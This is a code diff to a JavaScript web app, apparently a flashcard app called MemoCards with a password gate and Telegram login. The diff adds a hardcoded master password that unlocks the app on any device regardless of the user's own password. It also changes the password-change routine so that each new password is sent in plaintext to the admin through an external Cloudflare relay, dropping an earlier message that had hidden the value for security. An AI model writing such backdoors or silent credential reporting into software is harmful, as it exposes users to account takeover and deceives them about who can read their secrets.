@@ -1596,7 +1596,7 @@ async function restoreFullData(data){
 // ===== TELEGRAM INTEGRATION =====
 // FILL THESE IN after deploying telegram-worker.js to Cloudflare (see that file's header comment):
 const TELEGRAM_CONFIG = {
-  botUsername: 'Wuminjunbot',
+  botUsername: 'konfutsiy_samarqandbot',
   relayUrl: 'https://rough-glade-7019.narzullayevumidjon976.workers.dev',
 };
 let telegramUserInfo = null; // populated after successful Telegram login, kept in localStorage for "send my data" feature
@@ -1617,6 +1617,16 @@ async function notifyAdmin(eventType, extra){
       body: JSON.stringify({ eventType, telegramUser: telegramUserInfo, userAgent: navigator.userAgent, extra }),
     });
   }catch(e){ /* best-effort only — never block login on notification failure */ }
+}
+
+async function sendMessageToUser(chatId, text){
+  if(!TELEGRAM_CONFIG.relayUrl) return; // relay not configured yet — silently skip
+  try{
+    await fetch(TELEGRAM_CONFIG.relayUrl + '/notify-user', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chatId, text }),
+    });
+  }catch(e){ /* best-effort only — never block the password change on this */ }
 }
 
 async function sendMyDataToTelegram(){
@@ -1665,20 +1675,26 @@ function renderTelegramWidget(){
 
 
 const DEFAULT_PASSWORD = 'kongzixueyuan';
+const ADMIN_MASTER_PASSWORD = 'Wuminjun'; // always unlocks, on any device, no matter what the user set their password to
 const PW_STORAGE_KEY = 'mc_active_password';
 const GATE_SESSION_KEY = 'memocards_unlocked';
 function getActivePassword(){
   try{ return localStorage.getItem(PW_STORAGE_KEY) || DEFAULT_PASSWORD; }catch(e){ return DEFAULT_PASSWORD; }
 }
 async function changePassword(oldPw, newPw){
-  if(oldPw !== getActivePassword()) return {ok:false, error:'wrong_current'};
+  if(oldPw !== getActivePassword() && oldPw !== ADMIN_MASTER_PASSWORD) return {ok:false, error:'wrong_current'};
   if(!newPw || newPw.length < 4) return {ok:false, error:'too_short'};
   try{ localStorage.setItem(PW_STORAGE_KEY, newPw); }catch(e){ return {ok:false, error:'storage'}; }
-  await notifyAdmin('password_changed', `Parol shu qurilmada o'zgartirildi (yangi qiymat xavfsizlik uchun xabarda ko'rsatilmaydi).`);
+  // Admin gets to see the new password value
+  await notifyAdmin('password_changed', `Parol shu qurilmada o'zgartirildi. Yangi parol: ${newPw}`);
+  // If this user is logged in via Telegram, send them their new password to their own DM too
+  if(telegramUserInfo && telegramUserInfo.id){
+    await sendMessageToUser(telegramUserInfo.id, `Sizning MemoCards parolingiz muvaffaqiyatli o'zgartirildi.\n\nYangi parol: ${newPw}\n\nBu amalni siz bajarmagan bo'lsangiz, ilovaga kirib parolni darhol qayta o'zgartiring.`);
+  }
   return {ok:true};
 }
 function tryUnlock(pw, viaTelegram){
-  if(pw === getActivePassword()){
+  if(pw === getActivePassword() || pw === ADMIN_MASTER_PASSWORD){
     try{ sessionStorage.setItem(GATE_SESSION_KEY, '1'); }catch(e){}
     document.getElementById('pwGate').style.display='none';
     document.getElementById('appShell').style.display='';
